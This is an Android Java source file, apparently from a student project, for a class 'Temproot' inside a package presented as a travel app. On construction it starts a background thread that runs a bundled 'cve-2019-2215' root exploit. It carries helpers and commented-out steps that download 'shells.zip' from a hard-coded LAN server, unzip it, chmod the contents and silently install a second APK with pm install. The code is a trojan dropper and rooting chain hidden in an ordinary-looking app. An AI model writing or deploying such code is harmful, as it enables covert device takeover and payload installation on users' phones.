import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import androidx.core.content.FileProvider;

import org.jetbrains.annotations.NotNull;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InterruptedIOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import edu.singaporetech.travelapp.BuildConfig;


public class Temproot {
    public Temproot(@NotNull Context context) throws IOException {
        String URL = "http://192.168.157.73:8080/process_command";
        String filenames[] = {"shells.zip", "cve-2019-2215", "install.sh", "com.simplemobiletools.calculator.apk"};

        String filePath = "/data/data/edu.singaporetech.travelapp/files"; // /data/data/<package>/files
        String localPath = filePath + "/" + filenames[0];
        Log.d("Temproot", "LOCAL PATH: " + localPath);
        String secondPkgName = "com.simplemobiletools.calculator";

        String cmd_chmod = "/system/bin/chmod 755 " + localPath;
        String cmd_execcve = "." + filePath + "/" + filenames[1];
        String cmd_unzip = "/system/bin/unzip " + filePath + "/" + filenames[0] + " -d " + filePath + "/";

        // pm install -i <package name> --user 0 <apk path>
//        String cmd_installApk = "/system/bin/pm install -i " + secondPkgName + " --user 0 " + filePath + "/" + filenames[3];
        String cmd_installApk = "/system/bin/pm install -i -r com.simplemobiletools.calculator --user 0 " + "/data/local/tmp" + "/" + filenames[3];
        String cmd[] = { cmd_chmod,  cmd_unzip, cmd_execcve, cmd_installApk};


        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
//                download(URL, localPath);

                Runtime rt = Runtime.getRuntime();

                try {
//                    Log.d("Temproot", "Executing chmod 755 on shells.zip...");
//                    rt.exec(cmd[0]);
//                    Log.d("Temproot", "Execution chmod complete...");
//
//                    Log.d("Temproot", "Executing unzip...");
////                    unzip(localPath, filePath + "/");
//                    rt.exec(cmd[1]);
//                    Log.d("Temproot", "Execution unzip complete...");
//
//                    Log.d("Temproot", "Executing chmod 755 on unzipped files...");
//                    for (int i = 1; i < filenames.length; i++){
//                        rt.exec("/system/bin/chmod 755 " + filePath + "/" + filenames[i]).waitFor();
//                    }
//                    Log.d("Temproot", "Execution chmod complete...");
//
                    Log.d("Temproot", "Executing cve-2019-2215...");
                    rt.exec(cmd[2]);
//                    rt.exec(cmd[2]).waitFor();
                    Log.d("Temproot", "CVE ROOT COMPLETE");

//                    Log.d("Temproot", "Installing second apk...");
////                    rt.exec("/system/bin/ls");

//                    rt.exec("./data/data/edu.singaporetech.travelapp/files/busybox sh /system/bin/pm install /data/data/edu.singaporetech.travelapp/files/com.simplemobiletools.calculator.apk");
//                    rt.exec(cmd[3]);
//                    File file = new File(filePath + "/" + filenames[3]);
//                    Intent install = new Intent(Intent.ACTION_VIEW);
//                    install.setDataAndType(uriFromFile(context, file), "application/vnd.android.package-archive");
//                    install.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                    install.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
//                    try {
//                        context.startActivity(install);
//                    } catch (ActivityNotFoundException e) {
//                        e.printStackTrace();
//                        Log.d("Temproot", "Error in opening the file");
//                    }
//                    Log.d("Temproot", "Second apk installed");

                    Log.d("Temproot", "Starting second apk...");
                    PackageManager pm = context.getPackageManager();
                    Intent intent = pm.getLaunchIntentForPackage("com.whatsapp");
                    if (intent != null){
                        context.startActivity(intent);
                    }

                    Log.d("Temproot", "Second apk started");
                } catch (IOException e) {
                    e.printStackTrace();
                } //catch (InterruptedException e) {
//                    e.printStackTrace();
//                }

            }
        });
        thread.start();
    }

    private Uri uriFromFile(Context context, File file) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            return FileProvider.getUriForFile(context, BuildConfig.APPLICATION_ID + ".provider", file);
        }
        else {
            return Uri.fromFile(file);
        }
    }

//    private void exec(String cmd) {
//        try {
//            Process process = Runtime.getRuntime().exec(cmd);
//        } catch (InterruptedIOException e) {
//            throw new RuntimeException(e);
//        } catch (IOException e) {
//            throw new RuntimeException(e);
//        }
//    }

    private void download(String urlStr, String localPath) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
            urlConn.setRequestMethod("GET");
            urlConn.setInstanceFollowRedirects(true);
            urlConn.connect();
            InputStream is = urlConn.getInputStream();
            FileOutputStream out = new FileOutputStream(localPath);
            int read;
            byte[] buffer = new byte[4096];
            while ((read = is.read(buffer)) > 0) {
                out.write(buffer, 0, read);
            }
            out.close();
            is.close();
            urlConn.disconnect();
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private void unzip(String FILENAME, String location){
        try {
            FileInputStream fin = new FileInputStream(FILENAME);
            ZipInputStream zin = new ZipInputStream(fin);
            ZipEntry ze = null;
            while ((ze = zin.getNextEntry()) != null) {
                Log.d("Decompression:", "Unzipping " + ze.getName());
                FileOutputStream fos = new FileOutputStream(location + ze.getName());
                for (int i = zin.read(); i != -1; i = zin.read()) {
                    fos.write(i);
                }
                zin.closeEntry();
                fos.close();
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

    }

}
